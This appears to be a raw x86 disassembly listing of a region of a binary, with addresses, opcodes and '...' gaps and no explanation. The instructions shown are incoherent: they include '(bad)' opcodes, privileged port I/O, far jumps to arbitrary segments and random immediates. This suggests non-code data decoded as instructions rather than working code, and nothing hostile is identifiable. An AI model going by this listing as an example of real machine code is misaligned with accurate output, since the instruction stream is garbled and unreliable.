  423cae:	mov    dl,0xa9
  423cb0:	mov    bl,0xa9
  423cb2:	mov    ah,0xd2
  423cb4:	mov    bl,0x6c
  423cb6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423cb7:	sub    DWORD PTR [eax+0x5c16cc26],0xffffffcd
  423cbe:	adc    al,0xc8
  423cc0:	xor    al,BYTE PTR [eax+0x54]
  423cc3:	les    edx,FWORD PTR [ebx+0x340a0a62]
  423cc9:	jmp    0x1094:0x8256f737
  423cd0:	out    0x64,eax
  423cd2:	cmp    DWORD PTR [ebp-0x8],esp
  423cd5:	jle    0x423cde
  423cd7:	lock jle 0x423d51
  423cda:	add    eax,ebx
  423cdc:	shl    DWORD PTR [ecx],0x5d
  423cdf:	adc    al,0x48
  423ce1:	aaa    
  423ce2:	mov    bh,0xf0
  423ce4:	imul   ebx,DWORD PTR [ebx-0x7d6fc35b],0x150c1701
  423cee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423cef:	ret    0x3961
  423cf2:	in     al,dx
  423cf3:	dec    esp
  423cf4:	jle    0x423d0e
  423cf6:	clc    
  423cf7:	push   edi
  423cf8:	add    ch,0x80
  423cfb:	mov    cl,0xb6
  423cfd:	not    BYTE PTR cs:[edi-0x55]
  423d01:	outs   dx,DWORD PTR ds:[esi]
  423d02:	inc    edx
  423d03:	cmp    edx,DWORD PTR [edi]
  423d05:	test   DWORD PTR [esi],eax
  423d07:	jmp    0x423ca7
  423d09:	add    eax,0xbf81a800
  423d0e:	jns    0x423ced
  423d10:	sti    
  423d11:	ss call 0x6683918d
  423d17:	retf   
  423d18:	(bad)  
  423d19:	loop   0x423d1c
  423d1b:	xor    cl,BYTE PTR [edi-0x4f]
  423d1e:	pop    ds
  423d1f:	loope  0x423d65
  423d21:	addr16 dec edi
  423d23:	loop   0x423cd8
  423d25:	sti    
  423d26:	das    
  423d27:	fidiv  DWORD PTR [edx-0x7e756ba0]
  423d2d:	inc    esi
  423d2e:	test   BYTE PTR [edx-0x70],al
  423d31:	push   esp
  423d32:	xchg   ecx,eax
  423d33:	dec    ecx
  423d34:	pop    edx
	...
  423d95:	add    BYTE PTR [edx-0xa],ah
  423d98:	xchg   DWORD PTR [ecx],ecx
  423d9a:	xchg   edi,eax
  423d9b:	jns    0x423d8b
  423d9d:	dec    edi
  423d9f:	out    0x92,al
  423da1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423da2:	into   
  423da3:	and    eax,0x7d93d905
  423da8:	add    DWORD PTR [eax],eax
  423daa:	pop    es
  423dab:	add    DWORD PTR [eax],eax
  423dad:	add    dh,ah
  423daf:	or     DWORD PTR [ebx-0x4119ee2f],esp
  423db5:	enter  0x9036,0x52
  423db9:	pop    es
  423dba:	jp     0x423e0f
  423dbc:	stos   BYTE PTR es:[edi],al
  423dbd:	and    esp,DWORD PTR [ebx]
  423dbf:	jnp    0x423e20
  423dc1:	(bad)  
  423dc3:	mov    ah,0x7b
  423dc5:	add    esi,DWORD PTR [edx+0x577d2f1]
  423dcb:	pop    esp
  423dcc:	add    eax,0xe665fd18
  423dd1:	lds    eax,FWORD PTR [eax]
  423dd3:	iret   
  423dd4:	test   al,0xc9
  423dd6:	daa    
  423dd7:	and    eax,0x68b83c86
  423ddc:	or     eax,0xda049bf3
  423de1:	aaa    
  423de2:	mov    ah,0x65
  423de4:	gs pop ecx
  423de6:	cdq    
  423de7:	add    BYTE PTR [edx+0x39],0xdd
  423deb:	inc    BYTE PTR [eax-0x714ac6bc]
  423df1:	mov    ecx,0x867acb5f
  423df6:	xchg   edx,eax
  423df7:	aaa    
  423df8:	fcmove st,st(0)
  423dfa:	xor    edi,0x6c
  423dfd:	int    0xe1
  423dff:	jge    0x423dc7
  423e01:	inc    edi
  423e02:	sub    ebp,edx
  423e04:	(bad)  
  423e05:	(bad)  
  423e06:	je     0x423d8c
  423e08:	inc    esp
  423e09:	or     eax,0x99dba6c1
  423e0e:	and    al,0x75
  423e10:	mov    cl,0xdb
  423e12:	fstp   DWORD PTR [esi+ecx*1+0x29a5918c]
  423e19:	add    BYTE PTR [eax],bl
  423e1b:	cmp    ah,bl
  423e1d:	mov    ch,0x28
  423e1f:	and    eax,0x530cf820
  423e24:	adc    al,0xdd
  423e26:	int    0x5b
  423e28:	imul   ebx,DWORD PTR [eax],0x20
  423e2b:	int    0x66
  423e2d:	cdq    
  423e2e:	das    
  423e2f:	cmp    DWORD PTR [eax-0x3e],esi
  423e32:	cmp    ax,WORD PTR [ecx+0x3cbc1d40]
  423e39:	pop    ss
  423e3a:	mov    eax,0xba21ec36
  423e3f:	inc    esi
  423e40:	mov    ds:0xe1dac27b,al
  423e45:	rcr    BYTE PTR [edi+0x4a16cd52],0x8c
  423e4c:	or     esi,DWORD PTR [esi-0x65f62753]
  423e52:	retf   
  423e53:	loop   0x423e48
  423e55:	outs   dx,BYTE PTR ds:[esi]
  423e56:	mov    esp,0x7a8f486e
  423e5b:	mov    ds:0x8933ee77,al
  423e60:	dec    ebx
  423e61:	sti    
  423e62:	and    bl,BYTE PTR [edi]
  423e64:	in     eax,dx
  423e65:	test   al,0x58
  423e67:	cmp    BYTE PTR [edi],0x10
  423e6a:	add    BYTE PTR [esi],dl
  423e6c:	call   0x19f3715
  423e71:	pop    ebp
  423e72:	mov    ch,0x7a
  423e74:	jbe    0x423e07
  423e76:	sbb    eax,0x2a9f09c7
  423e7b:	mov    ecx,0x67d411e0
  423e80:	xlat   BYTE PTR ds:[ebx]
  423e81:	scas   al,BYTE PTR es:[edi]
  423e82:	inc    edx
  423e83:	and    ecx,ecx
  423e85:	xchg   DWORD PTR [edi-0x7f],esi
  423e88:	fidiv  WORD PTR [ecx]
  423e8a:	out    dx,eax
  423e8b:	sub    ebp,DWORD PTR [ecx-0x5d]
  423e8e:	adc    ah,BYTE PTR [edx-0x42dc9e4e]
  423e94:	je     0x423e43
  423e96:	adc    ah,ch
  423e98:	ret    
  423e99:	sti    
  423e9a:	cmc    
  423e9b:	out    0x38,al
  423e9d:	nop
  423e9e:	sti    
  423e9f:	lods   al,BYTE PTR ds:[esi]
  423ea0:	out    dx,al
  423ea1:	push   edx
  423ea2:	xor    edi,0xffffffe7
  423ea5:	mov    WORD PTR [edx+ebp*4],?
  423ea8:	dec    eax
  423ea9:	pushf  
  423eaa:	mov    dh,0x22
  423eac:	lahf   
  423ead:	aam    0x2f
  423eaf:	xlat   BYTE PTR ds:[ebx]
  423eb0:	push   es
  423eb1:	and    al,0xde
  423eb3:	cld    
  423eb4:	mov    edi,0x0
	...
  423f15:	add    BYTE PTR [esi+0x74b9649a],ch
  423f1b:	(bad)  
  423f1c:	call   FWORD PTR [edi+0x5086f531]
  423f22:	jle    0x423ef5
  423f24:	mov    bl,0xbc
  423f26:	call   0x1:0x700017e
  423f2d:	add    BYTE PTR [edi],bl
  423f2f:	fs stc 
  423f31:	mov    eax,0xd73af9
  423f36:	adc    DWORD PTR [edi],esi
  423f38:	lods   eax,DWORD PTR ds:[esi]
  423f39:	dec    edi
  423f3a:	rcr    BYTE PTR [ecx+0x3f],0xf7
  423f3e:	in     eax,0xd6
  423f40:	fist   WORD PTR [esi-0x2df2a005]
  423f46:	add    esp,0x8804e44c
  423f4c:	sub    DWORD PTR [esi],0x63
  423f4f:	retf   0x774f
  423f52:	and    al,0x5c
  423f54:	xchg   BYTE PTR [ecx+0x1f],al
  423f57:	into   
  423f58:	leave  
  423f59:	lds    esi,FWORD PTR [ebx+0x3dd5e3d]
  423f5f:	mov    dh,0xed
  423f61:	xchg   BYTE PTR [edi-0x155cb8],bl
  423f67:	nop
  423f68:	inc    edi
  423f69:	mov    DWORD PTR ds:0xd3f91bfb,esi
  423f6f:	xor    ebp,DWORD PTR [ebp+ebp*1-0x631b40f6]
  423f76:	xchg   edi,eax
  423f77:	in     eax,0x95
  423f79:	mov    WORD PTR [ebp-0x49],es
  423f7c:	ret    
  423f7d:	sti    
  423f7e:	sbb    ecx,DWORD PTR [edi-0x49c5b55b]
  423f84:	cmc    
  423f85:	and    BYTE PTR [edx-0x45ddd31],al
  423f8b:	icebp  
  423f8c:	push   ss
  423f8d:	lods   al,BYTE PTR ds:[esi]
  423f8e:	mov    al,es:0x87e3a079
  423f94:	xchg   ecx,eax
  423f95:	xchg   esi,eax
  423f96:	shl    DWORD PTR [eax],cl
  423f98:	ret    0x8ce4
  423f9b:	stc    
  423f9c:	sub    ah,BYTE PTR [esi]
  423f9e:	dec    eax
  423f9f:	inc    eax
  423fa0:	ficom  WORD PTR [edi]
  423fa2:	and    bh,dh
  423fa4:	mov    eax,0xe2901624
  423fa9:	xchg   ebp,eax
  423faa:	xchg   ebp,eax
  423fab:	or     DWORD PTR [edi+0x6d],eax
  423fae:	mov    ds:0xace0d332,eax
  423fb3:	sub    al,0x15
  423fb5:	xchg   edx,eax
  423fb6:	in     al,dx
  423fb7:	ror    DWORD PTR ds:0xbc9eb02f,1
  423fbd:	adc    bh,BYTE PTR [ebx-0x1a]
  423fc0:	xchg   esi,eax
  423fc1:	rcl    BYTE PTR [edx],1
  423fc3:	add    ebx,DWORD PTR [edi+ebp*1+0x7c]
  423fc7:	sub    al,0x0
  423fc9:	retf   
  423fca:	call   0x68172036
  423fcf:	adc    DWORD PTR [edx],0xfc9287e5
  423fd5:	fdivr  QWORD PTR [esi+0x62b00522]
  423fdb:	imul   eax,esi,0x5e
  423fde:	(bad)  
  423fdf:	in     al,0x50
  423fe1:	push   cs
  423fe2:	jge    0x424052
  423fe4:	sbb    eax,0xdc688183
  423fe9:	mov    ?,WORD PTR ds:0x6e6029e1
  423fef:	adc    cl,BYTE PTR [ecx+0x38]
  423ff2:	arpl   WORD PTR [eax-0x60],cx
  423ff5:	mov    ds:0xf25cbf05,al
  423ffa:	jmp    FWORD PTR [esi-0x717cd01]
  424000:	int    0xb9
  424002:	sbb    bl,bl
  424004:	cmp    DWORD PTR [edx+0xa6ba67b],eax
  42400a:	pop    es
  42400b:	jnp    0x424075
  42400d:	pop    ss
  42400e:	and    esi,DWORD PTR [esi]
  424010:	xor    eax,0xffcfbb0f
  424015:	and    eax,0xe57b8de6
  42401a:	pop    esp
  42401b:	ret    
  42401c:	pop    ebp
  42401d:	xor    cl,BYTE PTR [edi+0x51fd32c3]
  424023:	and    eax,0xd4d57c05
  424028:	into   
  424029:	fadd   QWORD PTR [ecx-0x1a]
  42402c:	mov    dl,0x6e
  42402e:	dec    DWORD PTR [edx+eax*2-0x6850a40d]
	...
  424095:	add    BYTE PTR [eax+ebx*2+0x2e],bh
  424099:	mov    cl,0x2e
  42409b:	idiv   edi
  42409d:	fnsave [edi+0x37aa1cf1]
  4240a3:	mov    ecx,0x7fa17bd0
  4240a8:	add    DWORD PTR [eax],eax
  4240aa:	pop    es
  4240ab:	add    DWORD PTR [eax],eax
  4240ad:	add    BYTE PTR [ebx+0x2a3fdba1],dh
  4240b3:	xlat   BYTE PTR ds:[ebx]
  4240b4:	fidivr DWORD PTR [ecx+0x2385d233]
  4240ba:	jp     0x4240cd
  4240bc:	int3   
  4240bd:	xor    dl,BYTE PTR [ebx+0x4a2f740]
  4240c3:	int3   
  4240c4:	dec    esp
  4240c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4240c6:	in     eax,0x8b
  4240c8:	es aas 
  4240ca:	xchg   esi,eax
  4240cb:	add    al,0xa4
  4240cd:	and    BYTE PTR [ecx+0x78],0xff
  4240d1:	cmp    eax,0x8530aecf
  4240d6:	stos   DWORD PTR es:[edi],eax
  4240d7:	gs add eax,0x32b16979
  4240dd:	jge    0x424155
  4240df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4240e0:	arpl   WORD PTR [ebp+eax*8-0x2b],cx
  4240e4:	out    dx,eax
  4240e5:	cmp    eax,0x4417f45e
  4240ea:	shr    DWORD PTR [esi],cl
  4240ec:	jge    0x4240d3
  4240ee:	(bad)  
  4240ef:	sti    
  4240f0:	mov    al,BYTE PTR [ecx]
  4240f2:	pop    esi
  4240f3:	addr16 ret 
  4240f5:	(bad)  
  4240f6:	mov    eax,ds:0x4fe47846
  4240fb:	mov    ecx,0x506c81bd
  424100:	sub    eax,0xa7c3622a
  424105:	(bad)  
  424107:	and    BYTE PTR [esi],0x78
  42410a:	push   edx
  42410b:	mov    ebp,0xaa1c82c
  424110:	mov    dh,0x28
  424112:	cmp    dh,dl
  424114:	loope  0x42417a
  424116:	push   edx
  424117:	jecxz  0x4240dc
  424119:	rcl    DWORD PTR [ebp-0x2e53950b],cl
  42411f:	data16 (bad) 
  424122:	or     BYTE PTR fs:[ebp-0x21de300e],al
  424129:	and    eax,DWORD PTR [ecx+0x233d3b13]
  42412f:	popa   
  424130:	push   es
  424131:	mov    eax,0x15dc06f
  424136:	dec    esp
  424137:	stos   DWORD PTR es:[edi],eax
  424138:	mov    al,ds:0x76a3f77d
  42413d:	xlat   BYTE PTR ds:[ebx]
  42413e:	sub    al,0x1e
  424140:	cli    
  424141:	dec    BYTE PTR [ecx+0x4991665b]
  424147:	test   BYTE PTR [eax+0x10272f9],dh
  42414d:	mov    ds:0x5aad2117,eax
  424152:	adc    al,0xb3
  424154:	push   ebx
  424155:	fwait
  424156:	cmp    al,0xfd
  424158:	sahf   
  424159:	fnstcw WORD PTR [eax]
  42415b:	aad    0x0
  42415d:	cli    
  42415e:	in     eax,0x6c
  424160:	xchg   esi,eax
  424161:	mov    edi,0xccb45c35
  424166:	repz push ebx
  424168:	xchg   DWORD PTR [esi-0x4ce00d88],ebx
  42416e:	adc    dh,BYTE PTR [eax-0x26]
  424171:	xchg   ecx,eax
  424172:	sbb    BYTE PTR [edx+0x6b],0xa4
  424176:	std    
  424177:	pop    ebx
  424178:	sbb    eax,0xe34f896f
  42417d:	fistp  WORD PTR [esi]
  42417f:	fs mov edi,0xddbc3e6d
  424185:	and    DWORD PTR [edx],0x1c
  424188:	mov    cl,0xbd
  42418a:	xor    DWORD PTR [edi-0x494c8dca],edx
  424190:	call   0xcc2e:0xa72d6314
  424197:	cld    
  424198:	test   DWORD PTR [edi-0x3fe20377],edx
  42419e:	sar    DWORD PTR [ecx-0x4c],1
  4241a1:	push   ebp
  4241a2:	and    esi,DWORD PTR [ecx]
  4241a4:	or     dh,0x48
  4241a7:	sub    al,0xae
  4241a9:	pop    eax
  4241aa:	lds    edi,FWORD PTR es:[edi-0x754a5c7e]
  4241b1:	jg     0x4241aa
  4241b3:	mov    bh,0xea
	...
  424215:	add    BYTE PTR [edi-0x4c275c4c],al
  42421b:	(bad)  
  42421d:	call   DWORD PTR [edi+0x37d4b417]
  424223:	gs int3 
  424225:	xor    eax,0x180a8
  42422a:	pop    es
  42422b:	add    DWORD PTR [eax],eax
  42422d:	add    BYTE PTR [eax],al
  42422f:	shr    edx,cl
  424231:	and    cl,BYTE PTR [ebx+0x5d]
  424234:	out    0x99,eax
  424236:	mov    cl,0xd4
  424238:	and    esi,DWORD PTR [esi-0x15]
  42423b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42423c:	fdivr  QWORD PTR [edi+eiz*2+0x110e7994]
  424243:	inc    ebx
  424244:	call   0x4ce8:0xfbfa3bd7
  42424b:	lahf   
  42424c:	fdiv   QWORD PTR [edi-0x1d22e2a9]
  424252:	adc    al,0x43
  424254:	(bad)  
  424256:	out    0x5f,al
  424258:	shr    DWORD PTR [ecx+0x79],1
  42425b:	xchg   edi,eax
  42425c:	not    BYTE PTR [esi-0x28783708]
  424262:	jp     0x4242b9
  424264:	push   0xffffffef
  424266:	dec    edx
  424267:	sbb    eax,0x15f0691
  42426c:	out    0x24,al
  42426e:	dec    ebp
  42426f:	inc    ebp
  424270:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424271:	jnp    0x424279
  424273:	sahf   
  424274:	sub    dh,BYTE PTR [ecx+0x32b1823a]
  42427a:	aaa    
  42427b:	out    dx,eax
  42427c:	mov    al,0xf2
  42427e:	push   ebx
  42427f:	std    
  424280:	mov    edi,0xadf25d45
  424285:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424286:	inc    edi
  424287:	loop   0x42426c
  424289:	call   0xf21391a
  42428e:	jno    0x424215
  424290:	jecxz  0x4242f0
  424292:	mov    edi,0xbfc5b4dc
  424297:	mov    ebx,DWORD PTR [ecx+0x13]
  42429a:	inc    ecx
  42429b:	inc    ebp
  42429c:	in     al,0x5b
  42429e:	mov    ss,WORD PTR [ebx+edi*4-0x5df8cc21]
  4242a5:	pop    esi
  4242a6:	jp     0x4242bc
  4242a8:	add    BYTE PTR [ecx-0x5e725376],ah
  4242ae:	inc    eax
  4242af:	pop    edx
  4242b0:	or     ch,al
  4242b2:	xchg   esi,eax
  4242b3:	mov    ecx,0x7122a143
  4242b8:	jle    0x424274
  4242ba:	int    0x41
  4242bc:	jge    0x424330
  4242be:	dec    eax
  4242bf:	mov    ebp,0x4de47f6b
  4242c4:	enter  0x7e54,0x61
  4242c8:	mov    ebx,0xad9f43fc
  4242cd:	dec    esi
  4242ce:	(bad)  
  4242cf:	adc    al,0x52
  4242d1:	sub    ah,BYTE PTR [ecx+0x5c]
  4242d4:	dec    ecx
  4242d5:	popf   
  4242d6:	pop    ecx
  4242d7:	pop    ecx
  4242d8:	xlat   BYTE PTR ds:[ebx]
  4242d9:	lods   eax,DWORD PTR ds:[esi]
  4242da:	mov    ah,0xcc
  4242dc:	ret    0xee7b
  4242df:	mov    esp,0x30952008
  4242e4:	mov    DWORD PTR [esi],esi
  4242e6:	push   ss
  4242e7:	jb     0x424319
  4242e9:	or     dh,0xb6
  4242ec:	inc    DWORD PTR [ecx]
  4242ee:	push   ebx
  4242ef:	or     eax,DWORD PTR [ebx+0x7f446f0a]
  4242f5:	dec    ebx
  4242f6:	add    ch,al
  4242f8:	scas   al,BYTE PTR es:[edi]
  4242f9:	sub    BYTE PTR [eax],bh
  4242fb:	and    esp,0x1d1f133a
  424301:	mov    esp,0xa726869a
  424306:	cs mov esp,0xb7c0e679
  42430c:	in     al,dx
  42430d:	push   esp
  42430e:	into   
  42430f:	out    dx,al
  424310:	fld    TBYTE PTR [esi]
  424312:	jge    0x424374
  424314:	xor    bh,BYTE PTR [ebp-0x13]
  424317:	xchg   edx,eax
  424318:	aas    
  424319:	ret    
  42431a:	mov    bh,BYTE PTR [edx-0x3]
  42431d:	mov    eax,ds:0x724b6b89
  424322:	xchg   DWORD PTR [eax],ebp
  424324:	adc    al,0x6a
  424326:	adc    BYTE PTR [ebp+0x7bed7118],ch
  42432c:	pop    edi
  42432d:	test   eax,0x28b98c92
  424332:	cwde   
  424333:	mov    ch,0x77
	...
  424395:	add    BYTE PTR [edx-0x24582da],cl
  42439b:	sti    
  42439c:	iret   
  42439d:	test   DWORD PTR ss:[ebx],ebx
  4243a0:	sub    edx,ebp
  4243a2:	out    0x82,al
  4243a4:	jnp    0x424415
  4243a6:	scas   eax,DWORD PTR es:[edi]
  4243a7:	add    DWORD PTR [ecx],0x10700
  4243ad:	add    al,al
  4243af:	mov    eax,0xc9d1a05b
  4243b4:	mov    edx,0xd3613b
  4243b9:	ss mov dh,0x5b
  4243bc:	inc    ebp
  4243bd:	push   eax
  4243be:	ret    
  4243bf:	test   eax,0x9b3a43
  4243c4:	add    al,0xd
  4243c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4243c7:	sbb    edi,ebx
  4243c9:	stos   DWORD PTR es:[edi],eax
  4243ca:	neg    BYTE PTR [edi]
  4243cc:	push   esp
  4243cd:	lds    eax,FWORD PTR [ecx-0x6fd3b75]
  4243d3:	jl     0x424395
  4243d5:	in     eax,dx
  4243d6:	sub    al,0x68
  4243d8:	cli    
  4243d9:	mov    al,ds:0x32819fe2
  4243de:	or     BYTE PTR [esi],ah
  4243e0:	pop    edx
  4243e1:	jb     0x4243c8
  4243e3:	sub    bl,dh
  4243e5:	mov    esp,0x5dd482e
  4243ea:	sub    DWORD PTR [edx],ecx
  4243ec:	and    bh,BYTE PTR [ebx]
  4243ee:	dec    ebx
  4243ef:	fdiv   QWORD PTR [edx-0x4443d8f1]
  4243f5:	inc    eax
  4243f6:	add    DWORD PTR [ebx-0x12],ebx
  4243f9:	xor    al,0x94
  4243fb:	mov    ds:0x68a3e93c,eax
  424400:	add    al,0x79
  424402:	xchg   esp,eax
  424403:	lds    esi,FWORD PTR [ecx+0x0]
  424406:	inc    esi
  424407:	ins    DWORD PTR es:[edi],dx
  424408:	pop    esp
  424409:	inc    ebp
  42440a:	push   ss
  42440b:	xchg   ah,ch
  42440d:	jns    0x42443a
  42440f:	out    dx,al
  424410:	imul   edx,DWORD PTR [ecx+0x54],0xffffffaf
  424414:	(bad)  
  424415:	call   0xda505fbf
  42441a:	outs   dx,BYTE PTR ds:[esi]
  42441b:	stc    
  42441c:	xchg   esp,eax
  42441d:	(bad)  
  42441f:	add    al,BYTE PTR [esi+0xb]
  424422:	xor    DWORD PTR ds:0x4a84680e,eax
  424428:	xchg   ebx,eax
  424429:	xor    eax,0x4a080994
  42442e:	push   esi
  42442f:	dec    ebp
  424430:	jno    0x424423
  424432:	pop    esi
  424433:	mov    al,ds:0x94fa58c0
  424438:	in     eax,dx
  424439:	addr16 mov dl,0x3e
  42443c:	adc    al,0x82
  42443e:	cmp    BYTE PTR [edi-0x68a97329],ch
  424444:	jmp    0x2d75f908
  424449:	dec    ecx
  42444a:	sar    DWORD PTR [esi],cl
  42444c:	(bad)  
  42444d:	and    BYTE PTR [edx-0x75394f71],bh
  424453:	push   edi
  424454:	ins    BYTE PTR es:[di],dx
  424456:	pop    ecx
  424457:	jmp    0x7ddc:0xf137f95c
  42445e:	xchg   BYTE PTR [ebp+edi*4-0x7e9a344e],bl
  424465:	cmp    eax,0x6a2ce8d
  42446a:	xchg   esi,eax
  42446b:	xor    edi,ecx
  42446d:	inc    esi
  42446e:	sbb    bl,BYTE PTR [eax-0xf497597]
  424474:	popa   
  424475:	test   DWORD PTR [eax+0x78ade36],ebx
  42447b:	sbb    BYTE PTR [ebx-0x2],bh
  42447e:	mov    ebx,0xf61c0c35
  424483:	xor    edi,eax
  424485:	xor    esi,DWORD PTR [ebx]
  424487:	cdq    
  424488:	ds and ebp,edx
  42448b:	pop    ss
  42448c:	xchg   edi,eax
  42448d:	dec    esi
  42448e:	loop   0x42442b
  424490:	xchg   DWORD PTR [eax],ebx
  424492:	cmp    DWORD PTR cs:[ebx],0x3a2ca270
  424499:	cwde   
  42449a:	dec    DWORD PTR [edi-0x73951196]
  4244a0:	dec    edx
  4244a1:	cdq    
  4244a2:	icebp  
  4244a3:	in     eax,dx
  4244a4:	push   ds
  4244a5:	jl     0x4244d6
  4244a7:	(bad)  
  4244a8:	xchg   edi,eax
  4244a9:	inc    ebx
  4244aa:	adc    BYTE PTR [ebp-0x56],cl
  4244ad:	ja     0x424487
  4244af:	and    bh,BYTE PTR [ecx-0x38c19587]
	...
  424515:	add    al,ah
  424517:	outs   dx,DWORD PTR ds:[esi]
  424518:	xchg   esi,eax
  424519:	inc    edx
  42451a:	lahf   
  42451b:	sti    
  42451c:	hlt    
  42451d:	out    dx,eax
  42451e:	mov    al,ds:0x520ff3ab
  424523:	or     edx,edx
  424525:	xor    BYTE PTR [esi+0x7000182],0x1
  42452c:	add    BYTE PTR [eax],al
  42452e:	inc    esp
  42452f:	dec    esi
  424530:	or     esp,DWORD PTR [ebx]
  424532:	ret    
  424533:	ss pop es
  424535:	mov    dl,0xe0
  424537:	add    DWORD PTR ds:0xb345f932,edi
  42453d:	mov    bl,0xcd
  42453f:	ins    DWORD PTR es:[edi],dx
  424540:	dec    edi
  424541:	popa   
  424542:	xchg   esp,eax
  424543:	cmp    DWORD PTR [ecx],esi
  424545:	jecxz  0x42451a
  424547:	xchg   ebp,eax
  424548:	jno    0x42454b
  42454a:	nop
  42454b:	or     BYTE PTR [ecx+ebx*1+0x7e922d69],al
  424552:	pop    esi
  424553:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424554:	leave  
  424555:	and    al,0xf6
  424558:	pop    edi
  424559:	pop    esp
  42455a:	cdq    
  42455b:	mov    edx,DWORD PTR [esi-0x49ac881c]
  424561:	mov    esi,0x3055bdb
  424566:	cmp    al,0xce
  424568:	mov    ds:0xd1d18f3a,al
  42456d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42456e:	in     al,dx
  42456f:	xchg   esp,eax
  424570:	shr    BYTE PTR [esi-0x1bff1710],1
  424576:	scas   al,BYTE PTR es:[edi]
  424577:	push   es
  424578:	scas   al,BYTE PTR es:[edi]
  424579:	xchg   DWORD PTR [eax-0x20b40d8],ecx
  42457f:	dec    edi
  424580:	mov    WORD PTR [eax+0x40],?
  424583:	mov    eax,0x9b56e363
  424588:	rcl    DWORD PTR [esi-0x6],cl
  42458b:	xlat   BYTE PTR ds:[ebx]
  42458c:	pop    ebx
  42458d:	sub    dl,bh
  42458f:	cmp    eax,0x893f20f0
  424594:	xor    edi,DWORD PTR [ecx-0x4b]
  424597:	aas    
  424598:	in     eax,dx
  424599:	push   ebp
  42459a:	mov    esi,0x3a682149
  42459f:	mov    edx,0xd2e2d958
  4245a4:	loope  0x424536
  4245a6:	push   esi
  4245a7:	mov    dh,0xd2
  4245a9:	repz scas al,BYTE PTR es:[edi]
  4245ab:	(bad)  
  4245ac:	(bad)  
  4245ae:	aad    0xb3
  4245b0:	addr16 sbb eax,0xa4ec7a77
  4245b6:	sub    BYTE PTR [edx+0x7a3d5a18],0xf3
  4245bd:	std    
  4245be:	sti    
  4245bf:	add    eax,0x3a
  4245c2:	jl     0x42456e
  4245c4:	xor    DWORD PTR [ecx],0xa356aaf9
  4245ca:	mov    cl,bl
  4245cc:	retf   
  4245cd:	inc    ecx
  4245ce:	enter  0x378a,0x31
  4245d2:	call   0xec84da47
  4245d7:	xlat   BYTE PTR ds:[ebx]
  4245d8:	xlat   BYTE PTR ds:[ebx]
  4245d9:	mov    bh,0xec
  4245db:	sbb    DWORD PTR [eax+eax*2],edi
  4245de:	pop    edi
  4245df:	fild   QWORD PTR [edi]
  4245e1:	mov    edi,0xbaf37ec3
  4245e6:	cmp    al,0xfb
  4245e8:	cmc    
  4245e9:	test   eax,0xf784c190
  4245ee:	jmp    0x42460c
  4245f0:	or     eax,0x983d5d5f
  4245f5:	fwait
  4245f6:	mov    ebx,0x86e06889
  4245fb:	or     eax,0xae01b1cd
  424600:	and    bl,BYTE PTR [ecx+edi*2-0x2533b0c6]
  424607:	mov    esp,0xc4f8f10
  42460c:	in     eax,0x2d
  42460e:	imul   edx,edi,0x17
  424611:	int3   
  424612:	cmp    BYTE PTR [edi+0x2e9bc819],dh
  424618:	mov    dl,0xac
  42461a:	leave  
  42461b:	sbb    al,0x76
  42461d:	imul   eax,DWORD PTR ds:0xff81a70a,0x50ffa06d
  424627:	pop    ebp
  424628:	mov    dh,0x96
  42462a:	push   ss
  42462b:	shl    BYTE PTR [ecx-0xab31f3d],cl
  424631:	neg    DWORD PTR [ebp-0x1]
  424634:	add    DWORD PTR [eax],0x0
	...
  424696:	mov    esp,0xfefffc92
  42469b:	(bad)  
  42469c:	mov    edi,0x8f38d4d3
  4246a1:	cmp    edi,DWORD PTR [edi+0x50]
  4246a4:	adc    ebx,0x183bd
  4246aa:	pop    es
  4246ab:	add    DWORD PTR [eax],eax
  4246ad:	add    BYTE PTR [edx],dh
  4246af:	push   edx
  4246b0:	lods   al,BYTE PTR ds:[esi]
  4246b1:	(bad)  
  4246b2:	rcr    BYTE PTR [ecx+0x37adf8e8],0x97
  4246b9:	nop
  4246ba:	push   cs
  4246bb:	cld    
  4246bc:	cmp    ch,al
  4246be:	(bad)  
  4246c0:	cli    
  4246c1:	mov    DWORD PTR [ebx+0x1a],eax
  4246c4:	retf   0x7aae
  4246c7:	xrelease mov DWORD PTR [ebx],eax
  4246ca:	pusha  
  4246cb:	mov    ah,dl
  4246cd:	mov    ecx,0x49d5ed45
  4246d2:	sub    ah,BYTE PTR [eax-0x6ec425c8]
  4246d8:	mov    esi,0xa9efd311
  4246dd:	dec    ebx
  4246de:	sahf   
  4246df:	pop    ds
  4246e0:	mov    edx,0x8efebad2
  4246e5:	jno    0x424690
  4246e7:	shl    BYTE PTR [ebx+0x446ed381],1
  4246ed:	xchg   edx,eax
  4246ee:	push   es
  4246ef:	xor    ch,bl
  4246f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4246f2:	call   0x9cda2ffa
  4246f7:	in     al,dx
  4246f8:	inc    ebp
  4246f9:	push   ebx
  4246fa:	jecxz  0x4246e1
  4246fc:	mov    al,ds:0xbe398a47
  424701:	imul   esp,edx,0xffffffd4
  424704:	mov    ds:0x52deca92,eax
  424709:	adc    bh,BYTE PTR [edx+0x4cfbe69b]
  42470f:	mov    DWORD PTR [esi-0x4c47af4e],eax
  424715:	xor    edx,DWORD PTR [ecx+esi*8+0x6281c9c]
  42471c:	adc    DWORD PTR [edi-0x17],0xffffffb9
  424720:	or     bh,BYTE PTR [eax+ebx*8-0x3f]
  424724:	popa   
  424725:	or     al,al
  424727:	cmp    eax,0xc808bf17
  42472c:	pop    esp
  42472d:	int    0x55
  42472f:	xor    DWORD PTR [ebx+ebx*4-0x3b],esi
  424733:	sub    DWORD PTR [bp+di+0x33],eax
  424737:	test   eax,0xc8da9ce2
  42473c:	shl    BYTE PTR [edx-0x18],cl
  42473f:	jecxz  0x424748
  424741:	cmp    BYTE PTR [edi-0x4881eb78],al
  424747:	dec    ebx
  424748:	jmp    0x79efb048
  42474d:	inc    esi
  42474e:	jbe    0x4247c5
  424750:	mov    eax,0x1f1f16aa
  424755:	mov    esi,0x86e956aa
